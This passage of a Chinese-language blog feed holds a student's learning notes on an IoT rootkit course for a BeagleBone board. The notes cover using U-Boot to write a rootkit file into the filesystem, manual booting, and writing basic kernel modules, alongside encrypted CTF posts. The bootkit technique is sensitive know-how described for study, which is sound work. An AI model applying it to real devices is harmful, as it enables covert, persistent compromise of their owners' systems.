    <content type="html"><![CDATA[<p>最近特别忙啊写的好多东西都没时间更<br>下周又要考试。。。//周日要复习了<br>ctf又要比赛。。。//算了下四月有4次比赛(目前)<br>老师的pwn群还要刷题//而且堆题什么的貌似不是一天俩天能搞定的。。。<br>re也要接着刷//昨天刚好弄完一道hook，对hook有点基本认识<br>//hgame的week4的real，貌似是hook，可是题目已经找不到了啊！！！<br>。。。<br>迫于压力，周四上完课就回苏州了</p><a id="more"></a><p>//缓解一下<br>//其实是为了我的GF</p><p>废话说完了。。。先看看课题，是关于bootkit<br>主要是用U-BOOT整一个BK来达到篡改FS<br><img src="1.png" alt="1"><br>前几节课里讲过一些命令像ls啊什么的<br>可以让我们通过U-BOOT查看FS里的东西<br>然而，U-BOOT还能干很多事情<br>比如向FS里写东西，这就能被攻击者利用<br>比如攻击者吧自己电脑里的东西写进FS里</p><p>来看看怎么做吧<br>首先初始配置和上节课一样<br><img src="2.png" alt="2"><br>接下来把zImage复制进去并加载<br>加载完后zImage就在内存中了<br>然后可以把他放在你想的位置<br>比如这边是放在FS的/bin/rootkit中<br><img src="3.png" alt="3"><br>成功写入<br>加载地址用bdinfo查看<br>可以看到内存的起始地址<br>后面跟的是长度<br>用ls mmc 0:3 /bin<br>可以看到<br>rootkit已经被写入<br><img src="4.png" alt="4"><br>接下来输入reset重启下<br><img src="5.png" alt="5"><br>成功!!!</p><p>下一节<br>//时长25分钟<br>//看来又是一场恶战<br>听开头讲的貌似是关于<br>toolchain在固件中有什么用处<br>先看看什么是toolchain<br><img src="6.png" alt="6"><br><a href="https://zh.wikipedia.org/wiki/%E5%B7%A5%E5%85%B7%E9%8F%88">wiki</a><br>这边建议直接wiki<br>然后就是安装一个压缩包的东西<br>因为国内镜像貌似出了问题<br>我！！！<br>装了6小时！！！<br>//此处省略一堆脏话<br><img src="7.png" alt="7"><br>以后再也不瞎换国内源了<br><img src="8.png" alt="8"><br>这边是作者的教学计划<br>step1就是这节课要干掉的<br>然后下面作者介绍了一下工具<br>Crosstool-NG<br>然后解释它balabala怎么好啊<br>为什么要用它啊<br>然后就是漫长的安装过程<br><img src="9.png" alt="9"><br><img src="10.png" alt="10"><br>装半个多小时<br>中间遇到了很多问题<br>一直会卡死。。。<br>装了好多次啊。。。<br>心态爆炸<br>而且这节课的内容有点难理解。。。<br>//TODO</p>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
      <tag>rootkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot rootkit 学习 week-3</title>
    <link href="/2019/03/28/iot-rootkit-%E5%AD%A6%E4%B9%A0-week-3-1/"/>
    <url>/2019/03/28/iot-rootkit-%E5%AD%A6%E4%B9%A0-week-3-1/</url>
    
    <content type="html"><![CDATA[<p>这节课主要讲的是人工boot。。。</p><a id="more"></a><p><img src="1.png" alt="1"><br>这张图片讲的是Booting Process<br>像以前是U-Boot来加载uEnv.txt<br>这次是用U-Boot来人工引导Linux<br>大概听了下，大致流程就是不让U-BOOT加载uEnv.txt<br>以前的课程讲过uEnv.txt里面放了许多关于下一步的位置信息好像<br>既然不加载它，那U-BOOT就不能自动引导Linux<br>所以只能我们来手工做了<br>做的其实就是uEnv.txt里的事情</p><h1 id="Linux-Kernel-amp-Device-Tree"><a href="#Linux-Kernel-amp-Device-Tree" class="headerlink" title="Linux Kernel &amp; Device Tree"></a>Linux Kernel &amp; Device Tree</h1><p>Linux Kernel位于mmc 0:2位置<br>第一步是要把zImage加载进系统的RAM中<br>我们可以用<br>printenv loadaddr来查看要加载进的地址<br>用<br><img src="2.png" alt="2"><br>bdinfo可以查看系统RAM的起始地址和总长度<br>加载的命令是<br>load mmc 0:2 $loadaddr zImage<br>下一个加载的是设备树<br>这一步也同理，可以看图<br><img src="3.png" alt="3"></p><h1 id="RFS"><a href="#RFS" class="headerlink" title="RFS"></a>RFS</h1><p>命令<br>console=ttyO0,115200n8 root=/dev/mmcblk0p3 rw rootfstype=ext4 rootwait<br>分别是控制台的信息，root的位置，还要类型ext4</p><h1 id="BOOT"><a href="#BOOT" class="headerlink" title="BOOT"></a>BOOT</h1><p>万事俱备<br>最后一步就是boot了<br>命令<br>bootz $loadaddr - $fdtaddr<br><img src="4.png" alt="4"><br>可以看到启动了</p><p>因为视频不怎么长<br>我直接把俩个放一起了鸭~</p><p>首先装好BBB<br><img src="5.png" alt="5"><br>这边必须吐槽<br>xps15没有网线插口<br>只能type-c转，然后发现，<br>只能转一个。。。<br>然后插上了BBB<br>我电脑怎么联网？？？<br>外加iPhone神奇的机制。。。热点搜索不到。。。<br>搞了我半天<br>废话不多说。。。<br>这节课讲的主要是通过网络来传输kernel<br>首先是ping<br>这个搞了我半天。。。应该是通过板子来联通虚拟机。。。<br><img src="6.png" alt="6"><br>弄了半天才弄好<br>然后就是检测运行<br>吧东西都拷贝进去<br><img src="7.png" alt="7"><br>接着进行加载<br><img src="8.png" alt="8"><br>完事后就能boot了<br><img src="9.jpg" alt="9"></p>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
      <tag>rootkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN刷题小记</title>
    <link href="/2019/03/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/03/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="73387d0689e73f53f776198f086b4f7e84e4ec94ba4a65e758d8ca71182aafb8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF 逆向 level up!!!</title>
    <link href="/2019/03/25/CTF-%E9%80%86%E5%90%91-level-uphexo-d/"/>
    <url>/2019/03/25/CTF-%E9%80%86%E5%90%91-level-uphexo-d/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="14e76dceec346c7525f23ea2f8bbcc2a9c4b1d6bde5107365ad6c0dd4964d3f4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot rootkit 学习 week2-2</title>
    <link href="/2019/03/21/iot-rootkit-%E5%AD%A6%E4%B9%A0-week2-2/"/>
    <url>/2019/03/21/iot-rootkit-%E5%AD%A6%E4%B9%A0-week2-2/</url>
    
    <content type="html"><![CDATA[<p>这节课讲的是关于扩展方面的<br>貌似要学许多函数<br>//而且这次视频也就十几分钟<br>//偷偷看了下下面的视频，也就俩三节20多分钟<br>//基本都是10几分钟了<br>//连5分钟的都有<br>//难不成要变的轻松了？？？</p><a id="more"></a><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>内容很简单<br>其实就是要定义一个打印函数，帮助我们以后调试用的<br><img src="1.png" alt="1"><br>首先像上次一样<br>然后打开文件加入定义<br><img src="2.png" alt="2"><br>也就一行不多<br>然后运行一下<br><img src="3.png" alt="3"><br>发现输出语句前有一个箭头指向了模块名和行数<br>然后在看看打印<br>下面就是照着作者说的<br>定义输出<br>主要是为了调试<br>我打了个are you ok<br><img src="4.png" alt="4"><br>这周比较轻松鸭。</p>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
      <tag>rootkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot rootkit 学习 week2-1</title>
    <link href="/2019/03/20/iot-rootkit-%E5%AD%A6%E4%B9%A0-week2-1/"/>
    <url>/2019/03/20/iot-rootkit-%E5%AD%A6%E4%B9%A0-week2-1/</url>
    
    <content type="html"><![CDATA[<p>这次主要是关于Linux内核编程</p><a id="more"></a><h1 id="Loadable-Kernel-Module-Basics"><a href="#Loadable-Kernel-Module-Basics" class="headerlink" title="Loadable Kernel Module Basics"></a>Loadable Kernel Module Basics</h1><p>何为可加载的内核模块？<br><img src="1.png" alt="1"><br>特别是在Linux系统中<br>分为用户空间，内核空间还有硬件空间。<br>其中用户的请求只能通过内核来与硬件交互<br>而内核是通过设备的驱动来与内核驱动<br>我们可以编写一些内核模块来提升内核能力<br>这些我们编写的模块就叫做LKM即Loadable Kernel Module</p><h1 id="LKM-lt-gt-Kernel"><a href="#LKM-lt-gt-Kernel" class="headerlink" title="LKM &lt;-&gt; Kernel"></a>LKM &lt;-&gt; Kernel</h1><p>一般的内核模块就是设备驱动<br>比如说无线遥控车上的<br>还有很多fs的驱动啊或者说有关安全方面的</p><h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><p><img src="2.png" alt="2"><br>注释都加上了<br>然后是makefile<br>这边遇上了很多问题。。。。。。。<br>首先编译错误。。。<br>看了半天才发现英文单词拼错了。。。<br>应该是AUTHOR<br>路径的话我写的是KERNEL_ROOT=/usr/src/linux-headers-4.15.0-46-generic make<br>和作者的不一样<br>搞定后可以查看<br><img src="3.png" alt="3"><br>然后就能玩了<br><img src="4.png" alt="4"><br>最后小提一下KERNEL_ROOT=/usr/src/linux-headers-4.15.0-46-generic make<br>是生成模块<br>而要删除要KERNEL_ROOT=/usr/src/linux-headers-4.15.0-46-generic make clean<br>看完了<br>看完了<br>看完了</p><p>最近都块自闭了。。。<br>pwn好难啊<br>我想re啊啊啊</p>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
      <tag>rootkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>32 or 64</title>
    <link href="/2019/03/15/32-or-64/"/>
    <url>/2019/03/15/32-or-64/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="eb7156f9f6dff7de29edd7476a573cefe5364e885cadee8d0e13ddbc84edb578"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">什么?!文章被加密了？听说你想要密码?获取方式1:点击下方按钮，扫描二维码，qq联系窝。获取方式2:桂苑41栋302-2当面py。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入angr之I_hate_smc</title>
    <link href="/2019/03/15/%E6%B7%B1%E5%85%A5angr%E4%B9%8BI-hate-smc/"/>
    <url>/2019/03/15/%E6%B7%B1%E5%85%A5angr%E4%B9%8BI-hate-smc/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="29daae5629ce0e313c0727e084685d7657a554db67aeb78ccab6b44b56a35f5a">6a853575790a278d61a40ddcd4e5020b943797075e2e41176ab4be70fda9060a8a7d2f61eab7e9ba20c64e11a2ca1cb078b6933e6d9120b4e9c88d3c217a5ef332261023dcc0487b4a8d7bdcf39e9512b0a1b2e9b3c430f2bea44b675af78d43eab908a10461a201c20b545eb9375f5297f2a3bbd2fbeb318775f982302fe1e1138a73d0a4b1fa4527924866748a45e65cbbaa6fa44bb856dcb839011ab6dc18eacda8157ba5ab12ee84ddd4249a9f5d94cc8430a32c6bd547d79f260d6d0e281773a40d0948414b64bad7ec781a6dedcd435bc055e0c5246fba86b08ddc9ab12378d1149f7c2163334fe857ff24b1d1615b2516072891a8b356da93fe7978c63a5989350d1873b955d145326b752635a062082b0197e38e81b99a43c088dfb604c2e86a311d19cff3272fd437a514ca806fbc89fa1b6419021031d637b41e6892ca643b12ace2e1d39b6b8ebf7992b8e81f59d2f31c33de2c8522f67451df8b7dafac3c6b1b71bb5ddbd719cd2149e5052003aef308c68530489f5967f22dfdb4238b80bf3056528fddaeb3657f4720164bc60d6a863de53160d87297259547edd85ef9e53bd94eae3c9f854910ceb6822fcbd327f82f27217cfde33ee192c4d0dce756aa00c4a61c10d58ceb39a6c726e336f039ab4a1565c72406c85c1ae77a506b38bc0626c595211cd0d58de4bbe14da582a57b0c3f355f21402d6130f10001d2777638fdf10a5d8c06c5b828e2ee19eac1b47698b97a6ef7a4a0dc3f372f266042271d900f5c0cd01045d8d7195aae3bb397f94698e3865c73c1a927a96fa86af9076c2750fcd805416186764c7b686230b62aa7a1b8501890b9875504babbd00aa1a8ae56d65cf6f0c4698ac01f3b012f5166322f2ff20c86be1da53976a50a7650b71294508326ad3fef69d01755f0bc4a7c6d707a2eadb2be5368e93ce53503eca4e83045037968b1d8203795e80ddba09cfd020ac86b18007b3875df43438d69025195e4bdcac5b249968fb6ab3af80f6e68b1b428ea70991fd955b71e90661874320c45a4f512812e1bf6ee2e6981d45be1a10e73420320cf9cdd64679a04e0155fb3d3022ee44dc61d54cebc0860a2ee787b5b1ef4c2d1f7f010c3f6d39eda4a0696ec4d00e80c63f608862d38cca830cded1ad81abb8a72ab1c9b92769f707d396854ae652717e0423edaf8a1f0440718396c8cadad0b1d76cb9dd94ded9ab40eb31befc38d3b40f48fba261cffaf15708764ffed9c6a4c4150786049676b2fe19e5227bf6714dc4ef756ff96c0af465ef05d0215b73af95ad28585fc5f7be2c8ea89e3119871c550e1b04919d93332ad4955f34d5e44fcb61b80137462395f1a39609e239a8f297e018cd547311b53d693e4fa04dcb6ab5c5dd3b0c8bfabdad29f9fe18d91a54a4fc57f3fe13dbe60f07dde516395aa0ae2bc6682eec99d8f01ba72bee3a16e14b28ed195fbe497c145361dbd7cc382bb32640fe597b9ade8c2d807895ea728053e19164819847e9a75ad0f846223c49c0668fcece74c1a40b59730efc12057e38d48f91f46a718bedc390c9ce3d3c32a3632c6699758e8ecbcd764f56640048113ea4ef5da5864357f73f009d2e195bb7752423ca4f064a2c926e00be6464b032b7f3713e60e0234534a434bfcb90cd408646451846b5c8ec3ee87b82c03942ccf2387dd0a41dac5a58361f1f12eacd62759a56201357ceb73c7a69ed03db54961bd5787a7bd9b46cbdd5738e00142255e903075e53324758c6aad8743f1f15d2ee404aa20a327b8b071cb1f60f9fd1584b57b310a76dfef613f85ece9bf3f6a235017a1572c1d3a773b3f80bbca18f49e24324dd7dc04005760dd08780b089b93512d7d298176c00152270c79002af497880068ee89b09c564cf2d44a14823a4454f29b1cf16d54ee09c79505a22b53db730c6903edd7232683592335a9aff1f999e4ae4aadcad0b5b48022985b8b22d11b07bce75682780f8bf65586289250328b5378e684f56d178a8f3d4e4378e84881423d22b0b4f46b9dde4200edd73f28e79518516aeb1b973e82eeac1a09b07be9ea8c659ce0b29577c9b476b043a5a8215739e0fd861b3753ee0dfd868b04ee90bb81886556503d60d2b4a1979300088242f4d5b5ecee3197885586422ac8a3fcdec1bc0b7aaded8ee680dd212c1b3ac94428742eeb3adc93e49b974539951b268315df94b561c3af1e5c9b0162c1c8fa068b0e7fead6910bf026eaf5c86c851a37468eca3ea0e921d919e6ffcec1d97c0af047a0c1bcc982881628624b6475b2ba116199c31f25cbd2660fdfa1d3a1f0dc291ca08672f3008feaa4e05412a87ec0eacccdfb07be6624b67379f7fea0b021615926b60648029c9bbd99166a0270b2f43f6c97f2eba7374b65c4c6196df6e12bcecea322b3a573b9cc922316f5f1105c7cd28c4b84a2018ce3c900e4141f596ea01587d6dce7aefd0c7ab380b3adc2e91e4273ce2432f6534d6017e02a804c2b3860a74b28e1b63cb55b99986c6370a4fea124707a3cb09d51a1b46e797fa1adfbf5305bae05df90730c15b58d440b28fae210ac77eacfe42e5e8045c0007ca5bf072e3e3d13566b630fbb6e9056c71fb1f32c775975996abad5e34d683f61674c148505326fee996b37e8cef4890e3bc8350df15064188256afd187599cf9af19091304ec8780a9bc40f1a0b4cee210d45861214dade5defafce53e66442b9171d9d64b56cf559c976e94f0f6c1a186002c346dca072fdebb7388445e298f164a76247e1a34eb4c0e5eecf6e1fd9eafc029c498f1f82b1d5f8e2f6fa5b68eba3d39690a626af799fcbd282b63a7d60ee9b74e5d94f82c5d0a25ceee8e8bd55fb06237ec129816568e732e0bddec6e5ace5cfbb989ce0c793556a5c638944d0f77a6b130ec5a7637db75b05b8d9d10e55ea2608f042ef47e2e8621632e50b2027b80075a38bfe2a9fa1cfdeec7cf8eeb77a042f0ae04cb8a68841c63040bc80cce60212d61d0e3228584fa77535aa6b80bd0d4846792051e4c682e3a62562b496a81ed215f7a12db890e123ae7c38fd573944d9b5fc46390190ee46b0db007c54db6bd6e66ea630fa1959c0427e2fa2feab88f7c277b16fb15f4406b730bcd39f34310c5cffb526b2cff1d835f86ad5f0cb355a79ea335530279c80fb3754b3a0023f4af2465fd5218c097623f257760102cdaab3260673b4a989a98eed78266eb325c2720067fe46ec3020c290ad386c0bbb92a1413ae565551597d944b04024c91db2494976babbfbd4c964cf03c5e266182253d3c6fad38e334f17686c5731915bd283d6e2c4d54f2b5f912c1afc0bc5406d9886e99fe072b595cf16e970feb152b539541cc9440d5bf6c63b6206498e7c0239dff77f45478635631b0a2e2e808c18b1b55cce208897d248d6fcb9de38693c4c247d8022ec4a84ed61b5e0a75794a6e5b398606df02288d7493a41f0d229e36e10b72c1839aa843ef31165bd1369c95b5a4b0fbe777b745878cd474e6417a97f8f547aa7ce1b6385e63e752c037e01263cc056416fbc031d0da4adadc15f24625975c1730089f097fa709b3aefc8b80dfa074d2ad0f2631d388b718830d10438517989292d9aea8b1e6ecc1bc7a01e2183b70222840bd00074cdd81d855fd95b40156149eeecfdedd42cd0a928ed717317ac2ba2c23c955c64594358be831947c2c5291c2620c79711925b470f0a8cea57ac27b9e087f7f34e52ab2504b2a1aa5028e784a1c7c7a05c38c0c0c0aa5ab7bb10221d43bc96fa9a165ae0d244f907086ac1b1d5ed20f97aa5a1935beb9f5fd115996b154734bffa59713ebf584e4b951d7e698b9e2cd8dae4073bc27c31b3596274cad7f1fb966fb49ff98bd33f1470c419db3124436b1b5ed3689c6d2764507e2aa791b3ce6d012f1ff00b6e3a427a360c8c6e0d9b00a5b4eefbc64ae8017626ef04fb3842eaf76739d89104449720745691a1a8b9bab0d8719917b0c838227c06df703ae377ac0651fa26eac67686bb62f4ccad7cba4f7478453eade7190affdfc64f3131fa891bf7dc3441a67ba6a51bdc659356927b5ed33b60dfccb486ae8d2065733a410eb1194212cd283989a08b54f2255f46b195fa2cd6762fd1312de026fd91f8b1cd0ec09a1cbedbeda3d7abe1a4943be63d87470399b7f48a4c4e7b8c28ce3980cbd8e90ed2a515fc36b4c4014bae579b56255c45fb86e5e3e1c6a8163859ec4fd68b9aaaadcba7ff087bed91416f6b23f085c380300aa63bf0c457f1c3ca476ccb6379accf74712fd83076c535fc11ca5ca8fd4da3039784fbae6b8ca6e65b84ea5ff3cd5a63799e1b7904791ebeeca6c2be4f9e53d18d57a6ef0718a4653ef9b8b2380bc2762a63b824e84fe75a89154fa73a655f2dd4387b5fc76b9bd0528a2112003db7da430f01c991d98ddb4921cec8a56ce2ed78c8373f20e46da4f9dc0886c37193e6ec7e56cc00cfc28d899fbc60e8b2af0ab5f0717c3737d41b04f56ac906de025843936eba6dc2357b7ee5e57132cd69ce852c76341f0bed4911ea3567cfc39394f21348838442240a8b68778f0c32162c373eaa5b6cb9a1ad6d98be1e0703e81e4a8617692d46f80752f0b0b84379ac65a9991b9265637481c0b726f20aeb5b200984fa84041ba763cbf345d0e1bee1754d0e43899f10e9b37752f39</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF刷题小记(1)</title>
    <link href="/2019/03/12/CTF%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
    <url>/2019/03/12/CTF%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="123989a91af846e19026405aa4d0de7c6c407a493bba7d91f4dbf9c782074976"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello movfuscator!</title>
    <link href="/2019/03/09/Hello-movfuscator/"/>
    <url>/2019/03/09/Hello-movfuscator/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="65a3e4db65739dded24b47e10faa8f53f49ad93125982e2e703e61d95c5197be">6a853575790a278d61a40ddcd4e5020b19605374dc1aea899944dd0361ba9835b95708b01ceee27490b529bfa13dc1389a1cd7d447dea26ed5166db5838b001b359da31ba41dcf1f3f04ae5bd1783628902388ae183de5ddd2e1e6fa244407b16e369bb94b658baf82031737fda8c3c19b12ad40427ad2e1b0077732670a564fc3154929c68ae9e9f1cae95e0b59f4569a8bb1fc281e37b4f94b178eb5cbfefdb231326d516dc7efd62ad366994195622e98c2b456fdb4a90dcc7a75ed41687539f396d2f216d11a2fb0f01132ef0921e9325e409c33a0f8fb0206bf37c59bba8e2798810e5c22b6cce4f399cc47d5fa13a1353e6402b8aca14cef1fa73b0ec1e404134091c264dfd9bdc8a6e515ecb19ff3690ceffba98d2f724dc92b629dba86d1bcc68a7e2f0ab17cb074f99398329aa3270574f248305047be13e343225ff4a1f2d7c5147f4bb0c29f019971fabd5b1593fe883410c0aa836e4bd8c1ab09dc1bc6323762f696930762d7f00ea3ccbe21ce44a0213eb4d60b747652482e6bc8b951f40ca40e6801d014c46527aa9b89d5a8e537c39f1f5fbd5664d3a447aa8856162c76a118b6f2a4fc47708e86fdeea2216fc6515eb71bf12057c658b060e4fd4869a0801b5e172478d1cb18914eff63487e82c5e31aa1afe1d38afdeb37aadfd9a4d9309c13b300f7d20acee8a661bfe24394eb602a936696e60284bc225ad22118df53acc47d835a86166bc2b38691b1f2999901e022ce8782fef6c51eb14b6cad80f8146ca7a06827405b408f1abb9bc7d71c2c2ac9240901fa2fbd52c13f894ac950f9b5431a2410365d27c99587130fd3c8f7ae01f5a2d96ff300d7294f5c05e7b4a9ddbb17897552948a7c89e526126b477c3f1984958dc0004a8b560963dcf1b5e3a8077f5a5f74d82138d7865daa7a8805697cb1e944fa96ba26c341f7dfd9135a28c40d2cb2aeb259f868dda7047a14a9b557920c43c5498e048543e0ed8ed6fdc9e7e5e91764a40dab079548e63da79dd0b2b36c04cc1cf48d8a4ba87a67a85ba084cc6adf806d38f195f20d94d83cb33f5695170dd4a95637c1bd93c97b10b79455de4a32743e626c19d80ba0c5f78d5b4e460cd81b4c86bc23bb8230e4138f85ee0ccd140952791b59bee8a7b00ef871e6211558b37a40e571b4536125272d743f0dcd6b35ab631555c27131dd220b25ee9c4e9e70b5c9e4466f94c4428299043d8f6ae2ebf613525a6200277f43649ca78e311b56dd773560e4293faad9f29aaf7cb3b68db77ca58d38059c81e84657c46c25b799cbb9dadfc73ffb2abb283905cdb94f70d9da90a303106a0b81b21c871a16aa6b4d447f353c36fc32f09e3b7a59df8377f72e6ec3f486a20754df8434296a6c8046064d3cd765c9ac560677db317aafdf3b42a0086b05da16cacdca90f623272826a266994eac42cb3d7f48a2015075532920c3d0e59c9ac92a8c2c224a0b8b121ced24494a0ec24089926596a7b550c92e8cd332ef100d037df0f731eb9638ca3aee1fe71224d9ab62245ce40053fb32c0007217d45aa0fec9ced121e2a5316c5da47e54305be55b7473b0ecbffbf0ba769e0de14c2150b793429a6c283498f3da007a2f3ccfc4e2875a9010f7c209adf22aee2ed05ccfa80509b2b4de2f013112ed489f3e2489aae37d4e6881051c8d08598964e3157baef31e1b8efe0c58853f54444f995659b44860008140c1f8498a0ce0680048da6d49293b323137231ef72758c247a53d10cf9296e1ca9e78d4d56d2960ed285dc11e4af9cb770207365cd75fd6af3989b89c1266636dd00e883782610102e3fc7811b102a431cfcf45aca85c90ff4f6dfed9574551110b4797d47aedf969145a60cdfb9c15ecb3fb792b66e66dbbcf401c7ef1438bf90053a29f84f82ade38154ca41cbf8e16ae38119253487befee3b1f4acf85aa4b800a1ca34a5706f68783a3219402768b807e61140c2a08cf78b1e161b69238d634a83fe7662f75c36ceeed78d766ad1a06b784e31e63ef3091d49ef8c0a97dece4f1eb62409f46086952d3b60a0088ccbe20858ef9ffbc983747bf8257a248edc362605bc400eeb2972158477fa9334c5d94e1f54949a20468c64a14fcd7bfc413c0ec3949e01fad25bd17ab81a614c9681f36705c446385ea92dc01fe988a8464e3c19f946143862d3e499931712612d5497759476e46b34a268fb82c4d37357e549340d2996b82815623bcb1fcc15cdf3f03a378ad1c8edb2e93b3056e497509399e123a5f922bf5b888c87a2161c210443daa1e58ca937e4f236ed30af2ae1f31cb16815313f31a8c2bb462d67a02dc4bb936bb7df65a87fe8fe3eaeb0c725bac492d1f0144fde8e47de91816028f116cf5ca5e8dddf3ced166980d1129e3902b507eeecada7aa39635d54a34d63a471192bf9ceb9370d52369bee074a50c1221eddca6c2b29973354854a7ccdf1c43b2ba3e77ae1e977bca5384b82402d274732540b8539e000a07a53cdfcc5732aee8a6157fcf9288dad1b663e8a947232fa7383ae329251e56e9a53e2fc588a8966fbadf30d5dc81193ff38132c26bf2c5316eec3826b780941ae630dddecbb1eea7716008ca12cd54704f803985207b884bfed1ce2dba0f276c73a687f34f77a4a3d55310f634f8c18b601b0bba08724baf4a213d4c55c5e94e2b41c93b6966be3881f7bad4408d25c780002e3bb1a88c80d2836e2b0c7206016b8433f599c66b608c680539aea02c656beff73c1e4c42cb09a2a80b32419090254c9ce6adddf3cb28064623c3b0190df530a24c50ea6cefe3c947b1bdfbc25350a1b161312f43ec2b0f081c4e203608ad44edd9a44ebe0969c349670625ca890463a4f5c0b327f9685f8bf01694a4a6e0a93933529ffc5f8a19eadc25681e02112f78490db23078c85b5d3b6edd9ba346a15e60b867d2e2382d6c0fbfaa934d6ebc7f0bb05d13b671827e2c1c520cbb4554ade7ebf509a4bf6a2fb2579f3ecd36a71c495cdf1d84a9026f636dc1e2d46871a1b668a01a238c973e071d6dfd0ebda2145817f7f723260b36ae5c1ce5eeb415715f5ace6be718cb9d5b5cd88d1f4655575dd43cb35aa2a449d000df9e715208563f7db92a48cd389b19904607f7314c05bc5e2756313f1aac5a135bbd44f1e8de3adea17f95381953a0140fd7d5fd57fe700d6c2fe4228ce5a76bfe4b037e050461066bb410d30a4e9ff3c04670e74a91eff2afbcf6fa34a587b4ceafd1a268dae761a3cf521ee0b561a842933476695aa13e71e238712047691539bd107c48ca2394e7df048cd65174f3aee8ec60c6e3fc86f79fe5cfb1f8e598ea953fc84ef48bc2b351b17436346b555569d954d5fd1182a7a20ba54566b4a972dc579351b170e8a4272ce87908c908a1597350fe345d781fb870a3f1ece062757d5c844e851b24063bc7e044ca918d